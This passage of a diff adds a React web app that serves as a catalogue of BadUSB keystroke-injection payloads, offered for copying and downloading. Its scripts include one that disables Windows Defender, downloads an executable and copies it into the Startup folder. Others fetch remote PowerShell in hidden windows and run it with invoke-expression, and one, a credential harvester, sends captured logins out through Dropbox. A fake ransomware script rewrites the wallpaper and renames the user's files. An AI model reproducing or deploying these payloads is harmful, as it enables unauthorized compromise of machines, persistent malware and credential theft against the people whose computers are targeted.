+STRING powershell -w h $k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i=0;$i -lt $k;$i++){$o.SendKeys([char] 175)}; 1..10|foreach {saps https://www.youtube.com/watch?v=U3sAkAWfxLY;sleep 1;$o.SendKeys('f')}
+ENTER`, category: 'Prank' },
+                { name: 'Fake Update (Edge)', content: `REM FalsePhilosopher
+REM let the ducky HID enumerate
+DELAY 300
+GUI r
+DELAY 500
+STRING microsoft-edge:https://fakeupdate.net/win10ue/
+ENTER
+DELAY 5000
+F11`, category: 'Prank' },
+                { name: 'Fake Update (IE)', content: `REM FalsePhilosopher
+REM let the ducky HID enumerate
+DELAY 300
+GUI r
+DELAY 500
+STRING iexplore -k https://fakeupdate.net/win7/
+ENTER
+DELAY 5000
+F11`, category: 'Prank' },
+                { name: 'Fake Windows Update', content: `REM AUTHOR: Eddie Devine
+REM TARGET: Windows 10
+REM DESCRIPTION: Installs to startup and runs Enderman's WindowsUpdate.exe.
+REM DO NOT USE THIS SCRIPT FOR HARMFUL OR ILLEGAL PURPOSES
+REM Disable Windows Defender:
+DELAY 1000
+CONTROL ESCAPE
+DELAY 500
+STRING Settings
+DELAY 500
+ENTER
+DELAY 300
+TAB
+DOWN
+DOWN
+DOWN
+ENTER
+DELAY 500
+TAB
+DOWN
+DOWN
+ENTER
+DELAY 500
+TAB
+TAB
+ENTER
+DELAY 500
+TAB
+TAB
+TAB
+TAB
+ENTER
+DELAY 500
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+ENTER
+DELAY 500
+ENTER
+DELAY 500
+DOWN
+ENTER
+DELAY 500
+STRING C:
+TAB
+ENTER
+DELAY 500
+ALT y
+DELAY 500
+ALT F4
+DELAY 100
+ALT F4
+REM Download and Run Malware:
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell
+CONTROL SHIFT ENTER
+DELAY 750
+ALT y
+DELAY 1000
+STRING $url = "https://FILEHOST.eddie09.repl.co/Windows_Update_Manager.exe"
+ENTER
+STRING $outpath = "C:\Windows Update Manager.exe"
+ENTER
+STRING Invoke-WebRequest -Uri $url -OutFile $outpath
+ENTER
+DELAY 1000
+STRING exit
+ENTER
+GUI r
+DELAY 500
+STRING cmd /c copy "C:\Windows Update Manager.exe" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
+ENTER
+GUI
+DELAY 100
+TAB
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+ENTER
+DELAY 100
+DOWN
+DOWN
+ENTER`, category: 'Prank' },
+                { name: 'JumpScare', content: `REM     Title: JumpScare
+REM     Author: I am Jakoby
+REM     Description: This payload is meant to torment your target to the fullest extent. Mission to JumpScare. See JumpScare.ps1 for more details
+REM     Target: Windows 10, 11
+
+REM     Start by minimizing all their current windows
+GUI m
+DELAY 500
+
+REM     Remember to replace the link with your link for the intended file to download if you are using a custom variation of this payload
+REM     Also remember to replace ?dl=0 with ?dl=1 at the end of your link so it is executed properly
+
+REM     --------------------------------------------------------------------------------------
+REM     THIS PAYLOAD IS PLUG AND PLAY. NO MODIFICATIONS NEEDED SIMPLY RUN THE CODE DOWN BELOW.
+REM     --------------------------------------------------------------------------------------
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/I-Am-Jakoby/hak5-submissions/main/OMG/Payloads/OMG-JumpScare/JumpScare.ps1?dl=1; invoke-expression $pl
+ENTER`, category: 'Prank' },
+                { name: 'LoL Uninstaller', content: `REM Title: lol_killer
+REM Author: Skelly
+REM Description: Script to uninstall League of Legends from the target system. Save your friends from their horrible addiction.  
+REM Target: Windows 10
+REM Version: 1.0
+REM Category: Prank
+DELAY 1000 
+GUI i 
+DELAY 1000 
+STRING apps and features 
+DELAY 1000
+ENTER
+DELAY 1000
+ENTER 
+TAB
+TAB
+TAB
+DELAY 1000
+STRING league of legends
+ENTER
+DELAY 1000
+TAB
+TAB
+TAB
+DELAY 1000
+ENTER
+TAB
+ENTER
+DELAY 1000 
+ENTER 
+ALT F4
+ALT F4`, category: 'Prank' },
+                { name: 'Ratlocker', content: `REM Title:          Ratlocker
+REM Author:	    Ratcode404(.github.io)
+REM Target:         Windows
+REM Description:    Adds ratcode file extensions, draws and sets background without the use of URLs or image download (avoid proxy blocking and detection). The original wallpaper will be backuped on \pictures\wallpaper.ratl0ck3r, so no files will be lost. The current setup only targets the files and folder structures on $HOME\Desktop\, but it could be easily extended by adjusting the path variable further down.
+
+REM Base delay after initiation and ps1 startup
+DELAY 250
+GUI d
+GUI r
+DELAY 100
+STRING powershell.exe
+ENTER
+DELAY 250
+
+REM Backup Wallpaper
+STRING Copy-Item "$HOME\AppData\Roaming\Microsoft\Windows\Themes\TranscodedWallpaper" -Destination $home\pictures\wallpaper.ratl0ck3r
+ENTER
+DELAY 250
+
+REM Create new wallpaper
+STRING Add-Type -AssemblyName System.Drawing
+ENTER
+STRING $filename = "$home\pictures\ratl0ck3r.png"
+ENTER
+STRING $bmp = new-object System.Drawing.Bitmap 1080,720
+ENTER
+STRING $font = new-object System.Drawing.Font Consolas,10
+ENTER
+STRING $brushBg = [System.Drawing.Brushes]::Black
+ENTER
+STRING $brushFg = [System.Drawing.Brushes]::Green
+ENTER
+STRING $graphics = [System.Drawing.Graphics]::FromImage($bmp)
+ENTER
+STRING $graphics.FillRectangle($brushBg,0,0,$bmp.Width,$bmp.Height)
+ENTER
+STRING $graphics.DrawString('Your device has been encrypted by ratlocker.
+ENTER
+ENTER
+STRING            ____()()
+ENTER
+STRING          /      OO
+ENTER
+STRING     ~~~~~\_;m__m._>o
+ENTER
+ENTER
+ENTER
+STRING Oops! Your files have been encrypted.ENTER
+ENTER
+STRING If you see this text, your files are no longer accessible. You might
+ENTER
+STRING have been looking for a way to recover your files, but do not waste
+ENTER
+STRING your time. No one will be able to recover them without a decrytion
+ENTER
+STRING service.
+ENTER
+ENTER
+STRING We gurantee that you can recover all your files safely. All you need
+ENTER
+STRING to do is get the decryption password.
+ENTER
+ENTER
+STRING Visit out web services at: fakerat404linkszt3xaxqzf2nm12.onion
+ENTER
+ENTER
+STRING Your personal installation key #1:
+ENTER
+ENTER
+STRING b0d549572a40f93aa57400dbe43ee72a5e545f47765ef5fb7d17c7e83001cb3d',$font,$brushFg,10,10)
+ENTER
+STRING $graphics.Dispose()
+ENTER
+STRING $bmp.Save($filename)
+ENTER
+DELAY 500
+
+REM Set new wallpaper
+STRING $MyWallpaper="$home\pictures\ratl0ck3r.png"
+ENTER
+STRING $code = @'
+ENTER
+STRING using System.Runtime.InteropServices;
+ENTER
+STRING namespace Win32{
+ENTER
+STRING      public class Wallpaper{
+ENTER
+STRING         [DllImport("user32.dll", CharSet=CharSet.Auto)]
+ENTER
+STRING          static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ;
+ENTER
+STRING          public static void SetWallpaper(string thePath){
+ENTER
+STRING            SystemParametersInfo(20,0,thePath,3);
+ENTER
+STRING          }
+ENTER
+STRING     }
+ENTER
+STRING  } 
+ENTER
+STRING '@
+ENTER
+STRING add-type $code 
+ENTER
+STRING [Win32.Wallpaper]::SetWallpaper($MyWallpaper)
+ENTER
+DELAY 500
+
+REM Add ratl0ck3r extension
+STRING dir $HOME\Desktop\* | Rename-Item -NewName {$_.name + ".ratl0ck3r"}
+ENTER`, category: 'Ransomware' },
+                { 
+                    name: 'Credential Harvester (Dropbox)', 
+                    content: `REM     Title: Credz-Plz
+
+REM     Author: I am Jakoby
+
+REM     Description: This payload is meant to prompt the target to enter their creds to later be exfiltrated with dropbox. See README.md file for more details.
+
+REM     Target: Windows 10, 11
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link for the intended file> ?dl=1; invoke-expression $pl
+ENTER
+
+REM     Remember to replace the link with your DropBox shared link for the intended file to download
+REM     Also remember to replace ?dl=0 with ?dl=1 at the end of your link so it is executed properly`,
+                    category: 'Exfiltration' 
+                }
+            ];
+
+            const handleSectionChange = (section) => {
+                setActiveSection(section);
+            };
+
+            const categories = ['All', 'Prank', 'Security', 'Utility', 'Ransomware', 'Exfiltration'];
+
+            const filteredScripts = badUSBScripts.filter(script => 
+              script.name.toLowerCase().includes(searchTerm.toLowerCase()) &&
+              (selectedCategory === 'All' || script.category === selectedCategory)
+            );
+
+            return (
+                <div className="app-container">
+                    <div className="sidebar">
+                        <div className="sidebar-icons">
+                            <i className="icon fas fa-home" onClick={() => handleSectionChange('home')}></i>
+                            <i className="icon fas fa-microchip" onClick={() => handleSectionChange('devices')}></i>
+                            <i className="icon fas fa-code" onClick={() => handleSectionChange('scripts')}></i>
+                            <i className="icon fas fa-history" onClick={() => handleSectionChange('history')}></i>
+                            <i className="icon fas fa-book" onClick={() => handleSectionChange('documentation')}></i>
+                            <div className="bottom-icons">
+                                <i className="icon fas fa-user" onClick={() => handleSectionChange('profile')}></i>
+                                <i className="icon fas fa-cog" onClick={() => handleSectionChange('settings')}></i>
+                            </div>
+                        </div>
+                    </div>
+                    <div className="main-content">
+                        <div className={`content-section ${activeSection === 'home' ? 'active' : ''}`}>
+                            <h2>Welcome to {AppName}</h2>
+                            <div className="home-content">
+                                <div className="greeting">
+                                    <h3>{getGreeting()}, {settings.userName}!</h3>
+                                    <p>It's {currentTime.toLocaleTimeString()} on {currentTime.toLocaleDateString()}</p>
+                                </div>
+                                <div className="summary">
+                                    <h4>At a Glance</h4>
+                                    <p>Total Scripts: {badUSBScripts.length}</p>
+                                    <p>Recent Downloads: {downloadHistory.length}</p>
+                                </div>
+                                <div className="featured-script">
+                                    <h4>Featured Script</h4>
+                                    <BadUSBCard 
+                                        scriptName={badUSBScripts[0].name}
+                                        scriptContent={badUSBScripts[0].content}
+                                        category={badUSBScripts[0].category}
+                                        setDownloadHistory={setDownloadHistory}
+                                    />
+                                </div>
+                                <div className="quick-actions">
+                                    <h4>Quick Actions</h4>
+                                    <button onClick={() => handleSectionChange('scripts')}>Browse Scripts</button>
+                                    <button onClick={() => handleSectionChange('devices')}>Manage Devices</button>
+                                    <button onClick={() => handleSectionChange('documentation')}>Read Docs</button>
+                                </div>
+                                <div className="news-ticker">
+                                    <h4>Latest Updates</h4>
+                                    <marquee>New security features added! | Check out our latest Prank scripts | Don't forget to update your devices</marquee>
+                                </div>
+                            </div>
+                        </div>
+                        <div className={`content-section ${activeSection === 'devices' ? 'active' : ''}`}>
+                            <h2>Devices</h2>
+                            <p>Manage your BadUSB devices here</p>
+                        </div>
+                        <div className={`content-section ${activeSection === 'scripts' ? 'active' : ''}`}>
+                            <div className="search-and-filter">
+                                <input 
+                                    type="text" 
+                                    placeholder="Search scripts..." 
+                                    value={searchTerm} 
+                                    onChange={(e) => setSearchTerm(e.target.value)}
+                                />
+                                <select 
+                                    value={selectedCategory} 
+                                    onChange={(e) => setSelectedCategory(e.target.value)}
+                                >
+                                    {categories.map(category => (
+                                        <option key={category} value={category}>{category}</option>
+                                    ))}
+                                </select>
+                            </div>
+                            <div className="badusb-grid">
+                                {filteredScripts.map((script, index) => (
+                                    <BadUSBCard 
+                                        key={index} 
+                                        scriptName={script.name} 
+                                        scriptContent={script.content} 
+                                        category={script.category}
+                                        setDownloadHistory={setDownloadHistory} 
+                                    />
+                                ))}
+                            </div>
+                        </div>
+                        <div className={`content-section ${activeSection === 'history' ? 'active' : ''}`}>
+                            <HistorySection downloadHistory={downloadHistory} />
+                        </div>
+                        <div className={`content-section ${activeSection === 'documentation' ? 'active' : ''}`}>
+                            <h2>{AppName} Documentation</h2>
+                            <div className="documentation-content">
+                                <h3>Getting Started</h3>
+                                <p>Welcome to the {AppName} documentation. Here you'll find information on how to use our platform effectively.</p>
+
+                                <h3>Using BadUSB Scripts</h3>
+                                <p>BadUSB scripts are powerful tools for automating USB-based tasks. Here's how to use them:</p>
+                                <ol>
+                                    <li>Browse the available scripts in the 'Scripts' section.</li>
+                                    <li>Click 'Copy' to copy the script to your clipboard.</li>
+                                    <li>Click 'Download' to save the script to your device.</li>
+                                </ol>
+
+                                <h3>Safety Precautions</h3>
+                                <p>Always exercise caution when using BadUSB scripts. Ensure you understand the script's functionality before executing it.</p>
+
+                                <h3>Troubleshooting</h3>
+                                <p>If you encounter any issues, please check our FAQ section or contact our support team.</p>
+                            </div>
+                        </div>
+                        <div className={`content-section ${activeSection === 'profile' ? 'active' : ''}`}>
+                            <ProfileSection />
+                        </div>
+                        <div className={`content-section ${activeSection === 'settings' ? 'active' : ''}`}>
+                            <h2>Settings</h2>
+                            <SettingsSection />
+                        </div>
+                    </div>
+                </div>
+            );
+        };
+
+        ReactDOM.render(<App />, document.getElementById('root'));
     </script>
 </body>
 </html>
